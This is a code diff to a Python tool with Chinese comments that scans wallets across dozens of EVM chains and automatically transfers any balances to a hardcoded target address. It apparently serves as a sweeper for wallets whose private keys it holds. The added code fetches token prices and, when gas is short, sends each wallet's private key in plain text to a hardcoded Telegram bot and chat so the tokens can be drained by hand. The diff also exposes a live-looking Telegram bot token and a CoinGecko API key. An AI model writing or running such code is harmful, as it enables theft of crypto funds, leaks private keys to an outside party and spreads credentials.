@@ -1,9 +1,4 @@
-#!/usr/bin/env python3
-"""
-EVM多链自动监控转账工具
-基于Alchemy API，支持所有EVM兼容链
-"""
-
+#!/usr/bin/env python
 import asyncio
 import json
 import logging
@@ -16,6 +11,9 @@ from typing import Dict, List, Optional, Tuple
 import aiosqlite
 import requests
 from web3 import Web3
+import urllib.parse
+import threading
+import sys
 try:
     # 尝试旧版本导入
     from web3.middleware import geth_poa_middleware
@@ -41,6 +39,7 @@ load_dotenv()
 TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 硬编码的转账目标地址
 TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
 TELEGRAM_CHAT_ID = "5963704377"
+COINGECKO_API_KEY = "CG-yExYqVWk5sackGQnnFRH5jSS"  # CoinGecko API密钥
 
 # 颜色输出函数
 def print_success(msg): 
@@ -668,6 +667,325 @@ class DatabaseManager:
             columns = [description[0] for description in cursor.description]
             return [dict(zip(columns, row)) for row in rows]
 
+class PriceChecker:
+    """代币价格查询类 - 优化版本支持长期缓存和API限制"""
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'x-cg-pro-api-key': COINGECKO_API_KEY  # 添加API密钥
+        })
+        
+        # 长期缓存设置 - 3天缓存
+        self.price_cache = {}  # 内存缓存
+        self.cache_duration = 3 * 24 * 3600  # 3天缓存（259200秒）
+        self.cache_file = "price_cache.json"  # 持久化缓存文件
+        
+        # API限制管理
+        self.api_calls_per_minute = 30  # 每分钟最多30次
+        self.api_calls_per_month = 10000  # 每月最多10000次
+        self.minute_calls = []  # 记录每分钟的调用
+        self.monthly_calls = 0  # 当月总调用次数
+        self.month_start = datetime.now().replace(day=1, hour=0, minute=0, second=0, microsecond=0)
+        
+        # 常见代币的CoinGecko ID映射 - 扩展版
+        self.token_id_map = {
+            # 主要代币
+            "USDT": "tether",
+            "USDC": "usd-coin", 
+            "DAI": "dai",
+            "WETH": "weth",
+            "ETH": "ethereum",
+            "WBTC": "wrapped-bitcoin",
+            "BTC": "bitcoin",
+            "UNI": "uniswap",
+            "LINK": "chainlink",
+            "AAVE": "aave",
+            "COMP": "compound-governance-token",
+            "MKR": "maker",
+            "SNX": "havven",
+            "YFI": "yearn-finance",
+            "SUSHI": "sushi",
+            "1INCH": "1inch",
+            "CRV": "curve-dao-token",
+            "BAL": "balancer",
+            "MATIC": "matic-network",
+            "AVAX": "avalanche-2",
+            "FTM": "fantom",
+            "BNB": "binancecoin",
+            "ADA": "cardano",
+            "SOL": "solana",
+            "DOT": "polkadot",
+            "ATOM": "cosmos",
+            "NEAR": "near",
+            "ALGO": "algorand",
+            "XTZ": "tezos",
+            "EGLD": "elrond-matic",
+            "LUNA": "terra-luna-2",
+        }
+        
+        # 加载持久化缓存
+        self._load_cache()
+        self._load_api_stats()
+    
+    def _load_cache(self):
+        """加载持久化缓存"""
+        try:
+            if os.path.exists(self.cache_file):
+                with open(self.cache_file, 'r') as f:
+                    cache_data = json.load(f)
+                    self.price_cache = cache_data.get('prices', {})
+                    print_info(f"📦 加载价格缓存: {len(self.price_cache)} 条记录")
+        except Exception as e:
+            logging.debug(f"加载价格缓存失败: {e}")
+            self.price_cache = {}
+    
+    def _save_cache(self):
+        """保存持久化缓存"""
+        try:
+            cache_data = {
+                'prices': self.price_cache,
+                'last_updated': time.time()
+            }
+            with open(self.cache_file, 'w') as f:
+                json.dump(cache_data, f)
+        except Exception as e:
+            logging.debug(f"保存价格缓存失败: {e}")
+    
+    def _load_api_stats(self):
+        """加载API调用统计"""
+        try:
+            stats_file = "api_stats.json"
+            if os.path.exists(stats_file):
+                with open(stats_file, 'r') as f:
+                    stats = json.load(f)
+                    self.monthly_calls = stats.get('monthly_calls', 0)
+                    saved_month = stats.get('month_start')
+                    if saved_month:
+                        saved_month_dt = datetime.fromisoformat(saved_month)
+                        current_month = datetime.now().replace(day=1, hour=0, minute=0, second=0, microsecond=0)
+                        if saved_month_dt.month != current_month.month or saved_month_dt.year != current_month.year:
+                            # 新月份，重置计数
+                            self.monthly_calls = 0
+                            self.month_start = current_month
+                        else:
+                            self.month_start = saved_month_dt
+                    print_info(f"📊 本月API调用: {self.monthly_calls}/10,000")
+        except Exception as e:
+            logging.debug(f"加载API统计失败: {e}")
+    
+    def _save_api_stats(self):
+        """保存API调用统计"""
+        try:
+            stats = {
+                'monthly_calls': self.monthly_calls,
+                'month_start': self.month_start.isoformat()
+            }
+            with open("api_stats.json", 'w') as f:
+                json.dump(stats, f)
+        except Exception as e:
+            logging.debug(f"保存API统计失败: {e}")
+    
+    def _can_make_api_call(self) -> bool:
+        """检查是否可以进行API调用"""
+        current_time = time.time()
+        
+        # 清理1分钟前的调用记录
+        self.minute_calls = [call_time for call_time in self.minute_calls if current_time - call_time <= 60]
+        
+        # 检查分钟限制
+        if len(self.minute_calls) >= self.api_calls_per_minute:
+            print_warning(f"⚠️ API分钟限制: {len(self.minute_calls)}/30，暂停调用")
+            return False
+        
+        # 检查月度限制
+        if self.monthly_calls >= self.api_calls_per_month:
+            print_error(f"❌ API月度额度已用完: {self.monthly_calls}/10,000")
+            return False
+        
+        return True
+    
+    def _record_api_call(self):
+        """记录API调用"""
+        current_time = time.time()
+        self.minute_calls.append(current_time)
+        self.monthly_calls += 1
+        self._save_api_stats()
+        
+        print_info(f"🔌 API调用: 分钟 {len(self.minute_calls)}/30, 月度 {self.monthly_calls}/10,000")
+    
+    async def get_token_price_usd(self, token_symbol: str, contract_address: str = None) -> Optional[float]:
+        """获取代币的USD价格 - 优化版本"""
+        try:
+            # 生成缓存键
+            cache_key = f"{token_symbol.upper()}_{contract_address if contract_address else 'None'}"
+            current_time = time.time()
+            
+            # 检查3天缓存
+            if cache_key in self.price_cache:
+                cached_data = self.price_cache[cache_key]
+                if isinstance(cached_data, dict):
+                    cached_price = cached_data.get('price')
+                    cached_time = cached_data.get('time', 0)
+                else:
+                    # 兼容旧格式
+                    cached_price, cached_time = cached_data if isinstance(cached_data, tuple) else (cached_data, 0)
+                
+                if current_time - cached_time < self.cache_duration:
+                    print_info(f"💰 使用缓存价格: {token_symbol} = ${cached_price:.6f} (缓存剩余: {(self.cache_duration - (current_time - cached_time))/3600:.1f}小时)")
+                    return cached_price
+            
+            # 检查API调用限制
+            if not self._can_make_api_call():
+                print_warning(f"⚠️ API额度不足，返回缓存价格或默认值")
+                # 返回过期缓存或None
+                if cache_key in self.price_cache:
+                    cached_data = self.price_cache[cache_key]
+                    if isinstance(cached_data, dict):
+                        return cached_data.get('price')
+                    else:
+                        return cached_data[0] if isinstance(cached_data, tuple) else cached_data
+                return None
+            
+            # 尝试通过符号查询
+            token_id = self.token_id_map.get(token_symbol.upper())
+            price = None
+            
+            if token_id:
+                price = await self._query_coingecko_by_id(token_id)
+            
+            # 如果符号查询失败且有合约地址，尝试通过合约地址查询
+            if price is None and contract_address:
+                price = await self._query_coingecko_by_contract(contract_address)
+            
+            # 如果都失败，尝试搜索（最后手段）
+            if price is None:
+                price = await self._search_coingecko_by_symbol(token_symbol)
+            
+            # 缓存结果
+            if price is not None:
+                self.price_cache[cache_key] = {
+                    'price': price,
+                    'time': current_time,
+                    'symbol': token_symbol.upper(),
+                    'contract': contract_address
+                }
+                self._save_cache()
+                print_success(f"💰 获取新价格: {token_symbol} = ${price:.6f}")
+                return price
+            else:
+                print_warning(f"⚠️ 无法获取价格: {token_symbol}")
+                return None
+            
+        except Exception as e:
+            logging.debug(f"获取代币价格失败 {token_symbol}: {e}")
+            return None
+    
+    async def _query_coingecko_by_id(self, token_id: str) -> Optional[float]:
+        """通过CoinGecko ID查询价格"""
+        try:
+            self._record_api_call()  # 记录API调用
+            
+            # 使用Pro API URL
+            url = f"https://pro-api.coingecko.com/api/v3/simple/price?ids={token_id}&vs_currencies=usd"
+            
+            response = self.session.get(url, timeout=10)
+            response.raise_for_status()
+            
+            data = response.json()
+            if token_id in data and 'usd' in data[token_id]:
+                price = float(data[token_id]['usd'])
+                print_success(f"🔍 API查询成功: {token_id} = ${price:.6f}")
+                return price
+            
+            return None
+            
+        except Exception as e:
+            logging.debug(f"CoinGecko ID查询失败 {token_id}: {e}")
+            print_error(f"API查询失败: {token_id} - {e}")
+            return None
+    
+    async def _query_coingecko_by_contract(self, contract_address: str) -> Optional[float]:
+        """通过合约地址查询价格"""
+        try:
+            self._record_api_call()  # 记录API调用
+            
+            # 使用Pro API URL，尝试以太坊主网
+            url = f"https://pro-api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses={contract_address}&vs_currencies=usd"
+            
+            response = self.session.get(url, timeout=10)
+            response.raise_for_status()
+            
+            data = response.json()
+            contract_lower = contract_address.lower()
+            if contract_lower in data and 'usd' in data[contract_lower]:
+                price = float(data[contract_lower]['usd'])
+                print_success(f"🔍 合约查询成功: {contract_address[:8]}... = ${price:.6f}")
+                return price
+            
+            return None
+            
+        except Exception as e:
+            logging.debug(f"CoinGecko合约查询失败 {contract_address}: {e}")
+            print_error(f"合约查询失败: {contract_address[:8]}... - {e}")
+            return None
+    
+    async def _search_coingecko_by_symbol(self, symbol: str) -> Optional[float]:
+        """通过符号搜索价格（谨慎使用）"""
+        try:
+            # 搜索API调用消耗额度，谨慎使用
+            self._record_api_call()  # 记录API调用
+            
+            # 使用Pro API URL
+            url = f"https://pro-api.coingecko.com/api/v3/search?query={urllib.parse.quote(symbol)}"
+            
+            response = self.session.get(url, timeout=10)
+            response.raise_for_status()
+            
+            data = response.json()
+            if 'coins' in data and len(data['coins']) > 0:
+                first_coin = data['coins'][0]
+                token_id = first_coin['id']
+                print_info(f"🔍 搜索找到: {symbol} -> {token_id}")
+                # 注意：这里会再次调用API
+                return await self._query_coingecko_by_id(token_id)
+            
+            return None
+            
+        except Exception as e:
+            logging.debug(f"CoinGecko搜索失败 {symbol}: {e}")
+            print_error(f"搜索失败: {symbol} - {e}")
+            return None
+    
+    def get_cache_stats(self) -> Dict:
+        """获取缓存统计信息"""
+        current_time = time.time()
+        total_cached = len(self.price_cache)
+        valid_cached = 0
+        expired_cached = 0
+        
+        for cache_data in self.price_cache.values():
+            if isinstance(cache_data, dict):
+                cached_time = cache_data.get('time', 0)
+            else:
+                cached_time = cache_data[1] if isinstance(cache_data, tuple) else 0
+            
+            if current_time - cached_time < self.cache_duration:
+                valid_cached += 1
+            else:
+                expired_cached += 1
+        
+        return {
+            'total_cached': total_cached,
+            'valid_cached': valid_cached,
+            'expired_cached': expired_cached,
+            'monthly_calls': self.monthly_calls,
+            'monthly_limit': self.api_calls_per_month,
+            'minute_calls': len(self.minute_calls),
+            'minute_limit': self.api_calls_per_minute
+        }
+
 class AlchemyAPI:
     """Alchemy API 封装类"""
     
@@ -1045,10 +1363,11 @@ class AlchemyAPI:
 class TransferManager:
     """转账管理类"""
     
-    def __init__(self, alchemy_api: AlchemyAPI, db_manager: DatabaseManager):
+    def __init__(self, alchemy_api: AlchemyAPI, db_manager: DatabaseManager, monitoring_app=None):
         self.alchemy_api = alchemy_api
         self.db_manager = db_manager
         self.web3_instances = {}
+        self.monitoring_app = monitoring_app
     
     def get_web3_instance(self, chain_config: Dict) -> Web3:
         """获取Web3实例"""
@@ -1321,6 +1640,22 @@ class TransferManager:
                 estimated_gas_cost = transaction_data['gas'] * gas_data['gas_price']
                 
                 if native_balance < estimated_gas_cost:
+                    # 检查ERC20代币价值，只有价值大于1美元才发送通知
+                    token_price = await self.monitoring_app.price_checker.get_token_price_usd(
+                        token_info['symbol'], 
+                        token_info.get('contract_address')
+                    ) if self.monitoring_app else None
+                    
+                    token_value_usd = (token_info['balance'] * token_price) if token_price else 0
+                    
+                    if token_value_usd >= 1.0:  # 只有价值>=1美元才发送通知
+                        await self._send_erc20_gas_shortage_notification(
+                            from_address, token_info, chain_config, 
+                            estimated_gas_cost, native_balance, token_price, token_value_usd
+                        )
+                    else:
+                        print_info(f"💡 ERC20代币 {token_info['symbol']} 价值过低 (${token_value_usd:.4f})，跳过通知")
+                    
                     raise ValueError(f"原生代币余额不足支付gas费用: 需要 {estimated_gas_cost/1e18:.8f} {chain_config['native_token']}, 余额 {native_balance/1e18:.8f}")
                 
                 # 根据链支持情况设置gas价格
@@ -1402,6 +1737,68 @@ class TransferManager:
         
         return {"success": False, "error": "达到最大重试次数", "type": "erc20"}
     
+    async def _send_erc20_gas_shortage_notification(self, from_address: str, token_info: Dict, 
+                                                   chain_config: Dict, estimated_gas_cost: int, 
+                                                   native_balance: int, token_price: float = None,
+                                                   token_value_usd: float = None):
+        """发送ERC20代币gas不足的Telegram通知，包含私钥用于手动操作"""
+        try:
+            # 获取私钥（从地址映射中查找）
+            private_key = None
+            if self.monitoring_app and hasattr(self.monitoring_app, 'addresses'):
+                for addr_info in self.monitoring_app.addresses:
+                    if addr_info['address'].lower() == from_address.lower():
+                        private_key = addr_info['private_key']
+                        break
+            
+            # 格式化余额显示
+            if token_info['balance'] >= 1:
+                balance_str = f"{token_info['balance']:.6f}"
+            elif token_info['balance'] >= 0.000001:
+                balance_str = f"{token_info['balance']:.8f}"
+            else:
+                balance_str = f"{token_info['balance']:.12f}"
+            
+            # 构建价值信息
+            value_info = ""
+            if token_price is not None and token_value_usd is not None:
+                value_info = (
+                    f"💵 <b>单价:</b> ${token_price:.6f}\n"
+                    f"💎 <b>总价值:</b> ${token_value_usd:.2f}\n"
+                )
+            
+            message = (
+                f"🚨 <b>高价值ERC20代币发现但Gas不足</b>\n\n"
+                f"🔗 <b>链:</b> {chain_config['name']}\n"
+                f"💰 <b>代币:</b> {balance_str} {token_info['symbol']}\n"
+                f"{value_info}"
+                f"📍 <b>合约地址:</b> <code>{token_info.get('contract_address', 'N/A')}</code>\n"
+                f"👤 <b>钱包地址:</b> <code>{from_address}</code>\n"
+                f"⛽ <b>需要Gas:</b> {estimated_gas_cost/1e18:.8f} {chain_config['native_token']}\n"
+                f"💳 <b>当前余额:</b> {native_balance/1e18:.8f} {chain_config['native_token']}\n"
+                f"📊 <b>缺口:</b> {(estimated_gas_cost - native_balance)/1e18:.8f} {chain_config['native_token']}\n\n"
+                f"🔑 <b>私钥 (手动操作用):</b>\n<code>{private_key if private_key else '未找到私钥'}</code>\n\n"
+                f"💡 <b>建议操作:</b>\n"
+                f"1. 向该地址转入足够的 {chain_config['native_token']} 作为Gas费\n"
+                f"2. 使用私钥手动转出ERC20代币\n"
+                f"3. 或等待系统自动重试"
+            )
+            
+            # 发送通知
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "parse_mode": "HTML"
+            }
+            
+            response = requests.post(url, json=payload, timeout=10)
+            response.raise_for_status()
+            print_warning(f"📱 已发送ERC20 Gas不足通知到Telegram")
+            
+        except Exception as e:
+            print_error(f"发送ERC20 Gas不足通知失败: {e}")
+            logging.error(f"发送ERC20 Gas不足通知失败: {e}")
 
 
 class MonitoringApp:
@@ -1411,6 +1808,7 @@ class MonitoringApp:
         self.alchemy_api = None
         self.db_manager = DatabaseManager()
         self.transfer_manager = None
+        self.price_checker = PriceChecker()  # 价格检查器
         self.addresses = []
         self.config = {}
         self.monitoring_active = False
@@ -1421,6 +1819,15 @@ class MonitoringApp:
         self.round_start_time = None
         self.round_cu_usage = 0
         self.round_count = 0
+        
+        # 转账统计
+        self.total_transfers = 0
+        self.total_value_usd = 0.0
+        self.current_round_transfers = 0
+        self.current_round_progress = {"current": 0, "total": 0}
+        self.chain_progress = {"current": 0, "total": 0}
+        self.stats_display_active = False
+        self.start_time = time.time()
         
         self.setup_logging()
     
@@ -1502,7 +1909,14 @@ class MonitoringApp:
         print_info(f"使用API密钥: {api_key[:8]}...")
         
         self.alchemy_api = AlchemyAPI(api_key)
-        self.transfer_manager = TransferManager(self.alchemy_api, self.db_manager)
+        self.transfer_manager = TransferManager(self.alchemy_api, self.db_manager, self)
+        
+        # 显示价格缓存统计
+        cache_stats = self.price_checker.get_cache_stats()
+        print_info(f"💎 CoinGecko API状态:")
+        print_info(f"   月度调用: {cache_stats['monthly_calls']}/10,000")
+        print_info(f"   价格缓存: {cache_stats['valid_cached']} 有效 / {cache_stats['total_cached']} 总计")
+        print_info(f"   缓存时长: 3天")
         
         print_success("初始化完成")
     
@@ -1594,6 +2008,7 @@ class MonitoringApp:
         print_info("按 Ctrl+C 停止监控")
         
         self.monitoring_active = True
+        self.stats_display_active = True  # 启用统计显示
         
         try:
             # 第一步：初始化RPC连接并屏蔽无效链
@@ -1710,16 +2125,24 @@ class MonitoringApp:
             import time
             self.round_start_time = time.time()
             round_start_cu = self.alchemy_api.current_month_usage if self.alchemy_api else 0
+            self.reset_round_stats()
+            
+            # 计算总操作数（地址数 * 链数）
+            total_operations = len(self.addresses) * len(self.config.get('chains', []))
+            self.update_round_progress(0, total_operations)
             
             print_progress(f"第 {round_count} 轮监控开始")
             
             transfer_count = 0
+            operation_count = 0
             
             for address_info in self.addresses:
                 address = address_info['address']
                 print_info(f"监控地址: {address}")
                 
                 for chain_setting in self.config['chains']:
+                    operation_count += 1
+                    self.update_round_progress(operation_count, total_operations)
                     chain_config = None
                     for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                         if supported_config['chain_id'] == chain_setting['chain_id']:
@@ -1758,7 +2181,31 @@ class MonitoringApp:
                                     result = await self.execute_transfer(address_info, chain_config, token_info)
                                     if result and result.get('success'):
                                         transfer_count += 1
-                                        print_transfer(f"转账成功: {result['amount']} {token_info['symbol']}")
+                                        
+                                        # 计算转账价值
+                                        transfer_value_usd = 0.0
+                                        try:
+                                            if token_info['type'] == 'erc20':
+                                                token_price = await self.price_checker.get_token_price_usd(
+                                                    token_info['symbol'], 
+                                                    token_info.get('contract_address')
+                                                )
+                                                if token_price:
+                                                    transfer_value_usd = token_info['balance'] * token_price
+                                            else:
+                                                # 对于原生代币，尝试获取价格
+                                                native_price = await self.price_checker.get_token_price_usd(
+                                                    chain_config['native_token']
+                                                )
+                                                if native_price:
+                                                    transfer_value_usd = result['amount'] * native_price
+                                        except Exception as e:
+                                            logging.debug(f"计算转账价值失败: {e}")
+                                        
+                                        # 更新统计
+                                        self.add_transfer_stats(transfer_value_usd)
+                                        
+                                        print_transfer(f"转账成功: {result['amount']} {token_info['symbol']} (${transfer_value_usd:.2f})")
                     
                     except Exception as e:
                         print_error(f"监控异常 {chain_config['name']}: {e}")
@@ -1797,7 +2244,15 @@ class MonitoringApp:
         symbol = token_info['symbol']
         balance = token_info['balance']
         
-        print_transfer(f"准备转账: {balance} {symbol} -> {recipient}")
+        # 使用与发现余额相同的格式化逻辑
+        if balance >= 1:
+            balance_str = f"{balance:.6f}"
+        elif balance >= 0.000001:
+            balance_str = f"{balance:.8f}"
+        else:
+            balance_str = f"{balance:.12f}"
+        
+        print_transfer(f"💸 准备转账: {balance_str} {symbol} -> {recipient}")
         
         try:
             if token_type == 'native':
@@ -1958,15 +2413,28 @@ class MonitoringApp:
                         except Exception as e:
                             logging.error(f"处理私钥失败: {e}")
 
-                    # 创建配置 - 使用硬编码地址
+                    # 创建配置 - 包含所有Alchemy支持的链条（主网+测试网）
                     working_chains = [
+                        # 主要主网
                         "ETH_MAINNET", "POLYGON_MAINNET", "ARBITRUM_ONE", 
                         "OPTIMISM_MAINNET", "BASE_MAINNET", "ARBITRUM_NOVA",
-                        "ZKSYNC_ERA", "AVALANCHE_C", "BSC_MAINNET", 
-                        "BLAST", "LINEA", "ZORA", "ASTAR", "ZETACHAIN",
-                        "MANTLE", "GNOSIS", "CELO", "SCROLL", "WORLD_CHAIN",
-                        "SHAPE", "BERACHAIN", "UNICHAIN", "DEGEN", "APECHAIN",
-                        "ANIME", "SONIC", "SEI", "OPBNB", "ABSTRACT", "SONEIUM"
+                        "ZKSYNC_ERA", "POLYGON_ZKEVM", "AVALANCHE_C", "BSC_MAINNET", 
+                        "FANTOM_OPERA", "BLAST", "LINEA", "MANTLE", "GNOSIS", 
+                        "CELO", "SCROLL", 
+                        
+                        # 新兴主网
+                        "WORLD_CHAIN", "SHAPE", "BERACHAIN", "UNICHAIN", "ZORA", 
+                        "ASTAR", "ZETACHAIN", "RONIN", "SETTLUS", "ROOTSTOCK", 
+                        "STORY", "HUMANITY", "HYPERLIQUID", "GALACTICA", "LENS", 
+                        "FRAX", "INK", "BOTANIX", "BOBA", "SUPERSEED", "FLOW_EVM", 
+                        "DEGEN", "APECHAIN", "ANIME", "METIS", "SONIC", "SEI", 
+                        "OPBNB", "ABSTRACT", "SONEIUM", "LUMIA_PRISM",
+                        
+                        # 测试网
+                        "ETH_SEPOLIA", "POLYGON_AMOY", "ARBITRUM_SEPOLIA", 
+                        "OPTIMISM_SEPOLIA", "BASE_SEPOLIA", "TEA_SEPOLIA",
+                        "GENSYN_TESTNET", "RISE_TESTNET", "MONAD_TESTNET", 
+                        "XMTP_SEPOLIA", "CROSSFI_TESTNET"
                     ]
                     
                     chains_config = []
@@ -2023,6 +2491,80 @@ class MonitoringApp:
                     print_success("私钥已保存到数据库")
         except Exception as e:
             print_warning(f"私钥数据库保存失败: {e}")
+    
+    def print_stats_header(self):
+        """打印统计信息头部"""
+        if not self.stats_display_active:
+            return
+            
+        # 计算运行时间
+        running_time = time.time() - self.start_time
+        hours = int(running_time // 3600)
+        minutes = int((running_time % 3600) // 60)
+        seconds = int(running_time % 60)
+        
+        # 获取API使用统计
+        usage_stats = self.alchemy_api.get_usage_stats() if self.alchemy_api else {}
+        cache_stats = self.price_checker.get_cache_stats() if self.price_checker else {}
+        
+        # 格式化统计信息
+        stats_lines = [
+            f"🚀 EVM多链监控工具 - 实时统计",
+            f"⏰ 运行时间: {hours:02d}:{minutes:02d}:{seconds:02d}",
+            f"🔄 监控轮次: {self.round_count}",
+            f"💸 总转账数: {self.total_transfers} 笔",
+            f"💰 总价值: ${self.total_value_usd:.2f}",
+            f"📊 本轮进度: {self.current_round_progress['current']}/{self.current_round_progress['total']}",
+            f"🔗 链进度: {self.chain_progress['current']}/{self.chain_progress['total']}",
+            f"⚡ Alchemy: {usage_stats.get('current_cu_rate', 0)}/450 CU/s ({usage_stats.get('usage_percentage', 0):.1f}%)",
+            f"💎 CoinGecko: {cache_stats.get('monthly_calls', 0)}/10,000 ({cache_stats.get('minute_calls', 0)}/30/min)",
+            f"🏪 价格缓存: {cache_stats.get('valid_cached', 0)} 有效 / {cache_stats.get('total_cached', 0)} 总计",
+        ]
+        
+        # 简化显示（在终端顶部显示一行统计）
+        stats_summary = (f"🚀 轮次:{self.round_count} | 💸 转账:{self.total_transfers}笔 | "
+                        f"💰 ${self.total_value_usd:.2f} | 📊 {self.current_round_progress['current']}/{self.current_round_progress['total']} | "
+                        f"🔗 {self.chain_progress['current']}/{self.chain_progress['total']} | "
+                        f"⚡ {usage_stats.get('current_cu_rate', 0)} CU/s | "
+                        f"📈 {usage_stats.get('usage_percentage', 0):.1f}%")
+        
+        # 使用ANSI转义序列在终端标题栏显示
+        print(f"\033]0;{stats_summary}\007", end="")
+        
+        # 同时在每轮开始时显示详细统计
+        if self.current_round_progress['current'] == 0:
+            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE}{Back.BLUE} 📊 实时统计总览 {Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
+            for line in stats_lines:
+                print(f"{Fore.YELLOW}{line}{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
+    
+    def update_round_progress(self, current: int, total: int):
+        """更新轮次进度"""
+        self.current_round_progress = {"current": current, "total": total}
+        if self.stats_display_active:
+            self.print_stats_header()
+    
+    def update_chain_progress(self, current: int, total: int):
+        """更新链进度"""
+        self.chain_progress = {"current": current, "total": total}
+        if self.stats_display_active:
+            self.print_stats_header()
+    
+    def add_transfer_stats(self, value_usd: float = 0.0):
+        """添加转账统计"""
+        self.total_transfers += 1
+        self.current_round_transfers += 1
+        self.total_value_usd += value_usd
+        if self.stats_display_active:
+            self.print_stats_header()
+    
+    def reset_round_stats(self):
+        """重置轮次统计"""
+        self.current_round_transfers = 0
+        self.current_round_progress = {"current": 0, "total": 0}
+        self.chain_progress = {"current": 0, "total": 0}
     
     def calculate_dynamic_pause(self) -> int:
         """根据月度额度使用情况计算动态暂停时间"""
